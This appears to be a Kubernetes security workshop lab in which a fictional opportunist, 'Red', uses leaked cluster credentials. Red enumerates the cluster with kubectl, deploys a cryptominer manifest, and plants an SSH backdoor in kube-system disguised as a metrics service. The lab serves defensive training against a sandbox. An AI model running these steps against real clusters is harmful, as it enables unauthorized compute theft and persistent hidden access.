# Free Compute: Scenario 1 Attack

## Warning

In these Attack scenarios, we're going to be doing a lot of things that can be crimes if done without permission. Today, you have permission to perform these kinds of attacks against your assigned training environment.

In the real world, use good judgment. Don't hurt people, don't get yourself in trouble. Only perform security assessments against your own systems, or with written permission from the owners.

## Backstory

### Name: __Red__

* Opportunist
* Easy money via crypto-mining
* Uses automated scans of web IP space for specific issues
* Leverages off-the-shelf attacks

### Motivations

* __Red__ has been mining `bitcoinero` for a few months now, and it's starting to gain some value
* __Red__ is looking for free-to-them compute on which to run miners
* __Red__ purchased some leaked credentials from the dark web

## Thinking In Graphs

Attacking a system is a problem-solving process similar to troubleshooting: __Red__ begins with a goal (deploy an unauthorized cryptominer) but doesn't really know what resources are available to achieve that goal. They will have to start with what little they already know, perform tests to learn more, and develop a plan. The plan is ever-evolving as new information is gleaned.

The general process looks like this:

![attack lifecycle](img/attack-lifecycle.png)

* __Study__

    In this phase, use enumeration tools to start from the information you have, and get more information. Which tools to use will depend on the situation. For example, `nmap` is commonly used to enumerate IP networks. `nikto`, `burp`, and `sqlmap` are interesting ways to learn more about web applications. Windows and Linux administrative utilities such as `uname`, `winver`, and `netstat` provide a wealth of information about their host OSes.

* __Plan__

    In this phase, think about everything you currently know, and what actions you can take based on that knowledge. If you think you can do something that will help you get closer to your goal, move onto Attack. Otherwise, go back to Study and try to learn more.

* __Attack Something__

    In this phase, you take some action in the hope of getting closer to your goal. This may be running an exploit tool against a buggy piece of software, launching some kind of credential-guessing utility, or even just running a system command like kubectl apply. Your success or failure will teach you more about your target and situation. Move on to Study, Persist, or Win, as appropriate.

* __Persist__

    In this optional phase, you take some action to make it easier to re-enter the system or network at a later time. Common options are running a malware Remote Access Tool such as Meterpreter, creating new accounts for later use, and stealing passwords.

* __Win__

    Eventually, you may achieve your goals. Congratulations! Now you can stop hacking and begin dreaming about your next goal.

## Initial Access

__Red__ purchased a bundle of leaked credentials online. One set of credentials appears to be for a publicly accessible kubernetes cluster. They've downloaded the creds and want to connect to the cluster to see what's available.

```console
cd ./workshop/scenario_1
export KUBECONFIG=./kubeconfig
```

## Getting Some Loot

Since __Red__ has high-level credentials to the cluster, the process is fairly simple to start. They need to identify the resources available to them by poking around, and then run the cryptominer as easily as possible.

Let's become __Red__ and try some basic information-gathering commands to get a feel for the environment.

What namespaces are already on the cluster?
```console
kubectl get namespaces
```
What workloads are in the default namespace?
```console
kubectl get all
```
What workloads are deployed in all of the namespaces?
```console
kubectl get all -A
```
What operations can I run on this cluster?
```console
kubectl auth can-i --list
```
Can I create pods?
```console
kubectl auth can-i create pods
```

It looks like we have hit the jackpot! Let's see if we can start mining some crypto.
```console
cat > bitcoinero.yml <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    run: bitcoinero
  name: bitcoinero
  namespace: dev
spec:
  replicas: 1
  revisionHistoryLimit: 2
  selector:
    matchLabels:
      run: bitcoinero
  strategy:
    rollingUpdate:
      maxSurge: 25%
      maxUnavailable: 25%
    type: RollingUpdate
  template:
    metadata:
      labels:
        run: bitcoinero
    spec:
      containers:
      - image: securekubernetes/bitcoinero:latest
        name: bitcoinero
        command: ["./moneymoneymoney"]
        args:
        - -c
        - "1"
        - -l
        - "10"
        resources:
          requests:
            cpu: 100m
            memory: 128Mi
          limits:
            cpu: 200m
            memory: 128Mi 
EOF

kubectl apply -f bitcoinero.yml
sleep 10
kubectl get pods
```

We can see the bitcoinero pod running, starting to generate a small but steady stream of cryptocurrency. But we need to take a few more steps to protect our access to this lucrative opportunity. Let's deploy an SSH server on the cluster to give us a backdoor in case we lose our current access later.

```console
kubectl apply -n kube-system -f backdoor.yaml
sleep 10
kubectl get svc metrics-server-service -n kube-system -o table -o jsonpath='{.status.loadBalancer.ingress[0].ip}'
```

_MISSION ACCOMPLISHED_
